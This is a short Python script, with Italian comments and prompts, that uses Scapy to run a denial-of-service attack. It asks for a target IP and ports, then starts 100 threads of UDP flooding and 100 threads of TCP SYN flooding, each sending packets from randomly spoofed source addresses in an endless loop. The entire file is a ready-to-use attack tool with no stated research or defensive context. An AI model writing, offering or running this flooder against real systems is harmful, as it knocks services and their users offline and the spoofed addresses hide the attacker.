from scapy.all import *
import random
import threading

# --- Input dinamici ---
target_ip = input("Inserisci l'IP del target: ")
udp_port = int(input("Inserisci la porta UDP (es. 53): "))
tcp_port = int(input("Inserisci la porta TCP (es. 80): "))

# --- Genera IP spoofati ---
def spoof_ip():
    return ".".join([str(random.randint(1, 254)) for _ in range(4)])

# --- UDP Flood Thread ---
def udp_flood():
    while True:
        spoofed_ip = spoof_ip()
        pkt = IP(src=spoofed_ip, dst=target_ip) / UDP(sport=random.randint(1024, 65535), dport=udp_port) / Raw(load=random._urandom(2048))
        send(pkt, verbose=0)
        print(f"[UDP] Pacchetto inviato da {spoofed_ip} a {target_ip}")

# --- TCP SYN Flood Thread ---
def tcp_syn_flood():
    while True:
        spoofed_ip = spoof_ip()
        ip_layer = IP(src=spoofed_ip, dst=target_ip)
        tcp_layer = TCP(sport=random.randint(1024, 65535), dport=tcp_port, flags="S", seq=random.randint(1000, 9000))
        pkt = ip_layer / tcp_layer
        send(pkt, verbose=0)
        print(f"[TCP] Pacchetto SYN inviato da {spoofed_ip} a {target_ip}", end='\r')

# --- Avvio dei thread ---
for _ in range(100):  # Puoi aumentare o diminuire in base alla macchina
    threading.Thread(target=udp_flood, daemon=True).start()

for _ in range(100):
    threading.Thread(target=tcp_syn_flood, daemon=True).start()

# --- Mantieni lo script attivo ---
while True:
    pass


